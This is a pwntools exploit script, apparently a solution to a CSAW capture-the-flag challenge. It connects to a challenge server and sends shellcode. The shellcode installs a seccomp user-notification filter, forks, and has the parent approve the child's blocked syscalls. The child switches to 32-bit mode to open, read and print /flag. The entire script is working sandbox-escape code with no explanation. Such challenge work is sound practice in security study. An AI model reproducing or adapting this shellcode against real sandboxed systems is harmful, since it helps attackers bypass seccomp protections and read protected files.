from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
debug = 0
if debug:
    p = process("./chal4")
else:
    p = remote("how2pwn.chal.csaw.io",60004)
    # p = remote("0.0.0.0",60004)
with open("./ticket4",'r') as f:
    ticket = f.read().strip()
p.send(ticket)

context.arch = 'amd64'
shellcode = f'''
    mov esp,0xcafe800
    mov rsi,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx,0x7fc0000000000006
    push rbx
    mov rbx,0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx
    mov rdx,rsp
    mov rax,0x13d
    mov rdi,1
    syscall

    mov r8,rax
    mov al,0x39
    syscall
    cmp rax,0

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx,0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    mov rax,0x10
    mov rdi,r8
    mov rsi,0xc0502100
    mov rdx,0xcafec00
    syscall
copy_id_of_resp:
    mov rax, 0xcafec00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    xor rax,rax
    mov al,0x10
    mov rdi,r8
    mov esi,0xC0182101
    mov edx,0xcafec50
    syscall
    jmp parent_process

child_process:
    mov rcx,0x10000
wait_loop:
    dec rcx
    cmp rcx,0
    jne wait_loop
show_flag:
    mov rax,0x230cafe180
    push rax 
'''
X32_showflag ='''
    mov eax, 0x5
    mov ebx,0xcafe1f0
    xor ecx,ecx
    xor edx,edx
    int 0x80
    mov ebx,eax
    mov eax, 3
    mov ecx,esp
    mov cl,0x00
    mov edx,0x200
    int 0x80
    mov eax,0x4
    mov ebx,0x1
    int 0x80
'''

shellcode = asm(shellcode)+b'\xcb'
context.arch = 'i386'
context.bits = 32
shellcode = shellcode.ljust(0x180,b'\0') + asm(X32_showflag)
context.log_level='debug'
# gdb.attach(p)
p.sendafter(": \n",(shellcode).ljust(0x1f0,b'\0')+b"/flag\0")
p.interactive()
